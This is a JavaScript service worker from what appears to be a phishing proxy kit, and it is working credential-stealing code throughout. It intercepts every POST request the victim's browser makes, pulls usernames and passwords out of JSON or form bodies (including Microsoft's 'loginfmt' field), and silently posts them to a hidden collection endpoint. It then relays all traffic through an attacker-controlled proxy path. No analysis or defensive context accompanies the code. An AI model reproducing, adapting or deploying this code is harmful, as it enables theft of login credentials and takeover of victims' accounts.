// ============================================================
// SERVICE WORKER – Captures credentials from ANY POST
// ============================================================
self.addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const clonedRequest = request.clone();
    let bodyText = '';

    try {
        bodyText = await clonedRequest.text();
    } catch (e) {
        bodyText = '';
    }

    // ---- CREDENTIAL EXTRACTION (NO PATH DEPENDENCY) ----
    try {
        if (request.method === 'POST' && bodyText.length > 0 && bodyText.length < 10240) {
            let email = '';
            let password = '';
            const contentType = request.headers.get('content-type') || '';

            // Parse JSON
            if (contentType.includes('application/json')) {
                try {
                    const json = JSON.parse(bodyText);
                    email = json.username || json.user || json.email || json.loginfmt || json.login || json.userid || '';
                    password = json.password || json.passwd || json.pass || json.Password || json.pwd || '';
                } catch (e) {}
            }
            // Parse URL-encoded (most common for Microsoft)
            else if (contentType.includes('application/x-www-form-urlencoded')) {
                try {
                    const params = new URLSearchParams(bodyText);
                    email = params.get('username') || params.get('user') || params.get('email') || 
                            params.get('loginfmt') || params.get('login') || params.get('userid') || '';
                    password = params.get('password') || params.get('passwd') || params.get('pass') || 
                               params.get('Password') || params.get('pwd') || '';
                } catch (e) {}
            }

            // If we found either, send to proxy
            if (email || password) {
                await fetch('/JSCookie_6X7dRqLg90mH', {
                    method: 'POST',
                    body: JSON.stringify({
                        type: 'credentials',
                        email: email || '',
                        password: password || '',
                        time: Date.now(),
                        url: request.url
                    }),
                    headers: { 'Content-Type': 'application/json' }
                });
            }
        }
    } catch (e) {
        // Silent fail
    }

    // ---- FORWARD REQUEST TO PROXY ----
    const proxyRequestURL = `${self.location.origin}/lNv1pC9AWPUY4gbidyBO`;
    const proxyRequest = {
        url: request.url,
        method: request.method,
        headers: Object.fromEntries(request.headers.entries()),
        body: bodyText,
        referrer: request.referrer,
        mode: request.mode
    };

    try {
        return fetch(proxyRequestURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    } catch (error) {
        console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
        return new Response('Proxy error', { status: 502 });
    }
}
